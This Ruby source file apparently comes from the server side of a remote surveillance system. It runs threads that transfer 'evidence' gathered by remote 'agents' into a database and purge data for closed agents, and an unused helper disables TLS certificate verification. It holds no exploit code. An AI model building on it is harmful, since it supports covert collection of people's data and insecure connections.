#
#  Evidence Transfer module for transferring evidence to the db
#


# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/symbolize'
require 'rcs-common/path_utils'

require_release 'rcs-collector/db'
require_release 'rcs-collector/evidence_manager'


# from system
require 'thread'

module RCS
module Carrier

class EvidenceTransfer
  include Singleton
  include RCS::Tracer

  def start
    @workers = {}
    @http = {}
    @threads = Hash.new
    @worker = Thread.new { self.work }
  end

  def work
    # infinite loop for working
    loop do
      # pass the control to other threads
      sleep 1

      # don't try to transfer if the db is down
      next unless DB.instance.connected?

      # for each instance get the ids we have and send them
      EvidenceManager.instance.instances.each do |instance|

        # get the info and evidence from the instance
        evidence, info = get_evidence(instance)

        next if evidence.empty? or info.nil?

        # one thread per instance, but check if an instance is already processing
        @threads[instance] ||= Thread.new do
          begin

            trace :info, "Transferring evidence for: #{instance}"

            # make sure that the symbols are present
            # we are doing this hack since we are passing information taken from the store
            # and passing them as they were a session
            sess = info.symbolize
            sess[:demo] = (sess[:demo] == 1) ? true : false
            sess[:scout] = (sess[:scout] == 1) ? true : false

            # ask the database the id of the agent
            status, agent_id = DB.instance.agent_status(sess[:ident], sess[:instance], sess[:platform], sess[:demo], sess[:scout])
            sess[:bid] = agent_id

            case status
              when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
                trace :info, "[#{instance}] has status (#{status}) deleting repository"
                EvidenceManager.instance.purge(instance, {force: true})
              when DB::QUEUED_AGENT, DB::UNKNOWN_AGENT
                trace :warn, "[#{instance}] was queued, not transferring evidence"
              when DB::ACTIVE_AGENT
                raise "agent _id cannot be ZERO" if agent_id == 0
                # update the status in the db if it was offline when syncing
                DB.instance.sync_update sess, info['version'], info['user'], info['device'], info['source'], info['sync_time']

                # transfer all the evidence
                while (id = evidence.shift)
                  self.transfer instance, id, evidence.count
                end
            end

          rescue Exception => e
            trace :error, "Error processing evidences: #{e.message}"
            trace :error, e.backtrace
          ensure
            trace :debug, "Job for #{instance} is over (#{@threads.keys.size}/#{Thread.list.count} working threads)"

            # job done, exit
            @threads.delete(instance)
            Thread.kill Thread.current
          end
        end
      end
    end
  rescue Exception => e
    trace :error, "Evidence transfer error: #{e.message}"
    retry
  end

  def threads
    @threads.size
  end

  def get_evidence(instance)
    info = EvidenceManager.instance.instance_info instance
    EvidenceManager.instance.purge(instance, {force: true}) if info.nil?

    # get all the ids of the evidence for this instance
    evidence = EvidenceManager.instance.evidence_ids(instance)

    return evidence, info
  end

  def transfer(instance, id, left)
    evidence = EvidenceManager.instance.get_evidence(id, instance)
    raise "evidence to be transferred is nil" if evidence.nil?

=begin
    address = get_worker_address(instance)
    raise "invalid worker address" unless address

    ret, error, action = send_evidence(address, instance, evidence)
=end

    # send and delete the evidence
    ret, error, action = DB.instance.send_evidence(instance, evidence)

    if ret
      trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"

      StatsManager.instance.add ev_output: 1, ev_output_size: evidence.size

      EvidenceManager.instance.del_evidence(id, instance) if action == :delete
    else
      trace :error, "Evidence NOT sent to db [#{instance}]: #{error}"
      EvidenceManager.instance.del_evidence(id, instance) if action == :delete
    end
  end

  def get_worker_address(instance)
    return @workers[instance] if @workers[instance]

    address = DB.instance.get_worker(instance)
    trace :info, "Worker address for #{instance} is #{address}"

    @workers[instance] = address
  end

  def send_evidence(address, instance, evidence)

    host, port = address.split(':')

    http = @http[address] || (@http[address] = PersistentHTTP.new(
                  :name         => 'PersistentToWorker' + address,
                  :pool_size    => 20,
                  :host         => host,
                  :port         => port,
                  :use_ssl      => true,
                  :verify_mode  => OpenSSL::SSL::VERIFY_NONE
                ))

    full_headers = {'Connection' => 'Keep-Alive' }
    request = Net::HTTP::Post.new("/evidence/#{instance}", full_headers)
    request.body = evidence
    ret = http.request(request)

    case ret
      when Net::HTTPSuccess then return true, "OK", :delete
      when Net::HTTPConflict then return false, "empty evidence", :delete
    end

    return false, ret.body
  rescue Exception => e
    trace :error, "Error calling send_evidence: #{e.class} #{e.message}"
    trace :fatal, e.backtrace
    raise
  end

end
  
end #Collector::
end #RCS::